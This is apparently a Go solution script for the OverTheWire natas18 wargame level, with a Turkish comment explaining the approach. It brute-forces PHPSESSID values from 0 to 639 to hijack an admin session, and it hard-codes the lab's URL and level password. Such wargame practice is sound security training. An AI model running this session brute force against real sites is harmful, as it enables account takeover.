/*
natas18.php kodunu incelediğimizde session_id ile sesion id değerine 1 ile 640 arasında bir değer veriyor,
isValidAdminLogin yorum satırında olduğu için hiç bir türlü session daki admin keyini 1 yapamayacağız
bu yüzden session daki keyi değiştirmek yerine sınırlı sayıda olan session keylerini tek tek denemek daha mantıklı
aşşağıdaki kod da bunu yapmakta
*/

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	username = "natas18"
	password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
	url_     = "http://natas18.natas.labs.overthewire.org/"
	max_val  = 640
)

func main() {

	for i := 0; i < max_val; i++ {
		if pentest(i) {
			break
		}
	}

}

func pentest(sessionId int) bool {
	client := &http.Client{}
	postData := url.Values{}
	postData.Set("username", "admin")
	req, err := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	req.SetBasicAuth(username, password)
	if err != nil {
		log.Fatal(err)
	}

	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: strconv.Itoa(sessionId)})

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	if !strings.Contains(string(body), "You are logged") {
		fmt.Println(string(body))
		return true
	}
	return false
}
